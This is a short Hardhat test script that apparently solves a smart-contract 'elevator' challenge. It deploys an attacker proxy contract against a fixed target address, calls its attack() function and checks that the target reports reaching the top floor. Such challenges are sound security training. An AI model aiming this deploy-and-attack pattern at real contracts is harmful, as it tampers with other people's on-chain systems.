import { ethers } from "hardhat";
import { expect } from "chai";

describe("elevator", function() {
    it("should solve elevator challenge", async function() {
        this.timeout(0);

        // setup & check wallet account 
        const accounts = await ethers.getSigners();
        const eoa = accounts[0];
        let balance = await eoa.getBalance();

        console.log(ethers.utils.formatEther(balance));
        expect(balance).to.gt(0);

        // define target abi's necessary parts
        const targetABI = [
            "function goTo(uint _floor) public",
            "function top() public view returns (bool)",
        ]
        const targetAddr = "0x0a9911DeBf24A4dA9232242bD2358D3a89975B21";

        let contract = new ethers.Contract(targetAddr, targetABI, ethers.getDefaultProvider());
        let targetCont = contract.connect(eoa);

        const proxyFactory = await ethers.getContractFactory("ElevatorProxy");
        const proxyCont = await proxyFactory.deploy(targetAddr);
        await eoa.provider!.waitForTransaction(proxyCont.deployTransaction.hash);
        
        let tx = await proxyCont.attack();
        await tx.wait();
        console.log(tx);

        let isTop = await targetCont.top();
        expect(isTop).to.eq(true);
    });
});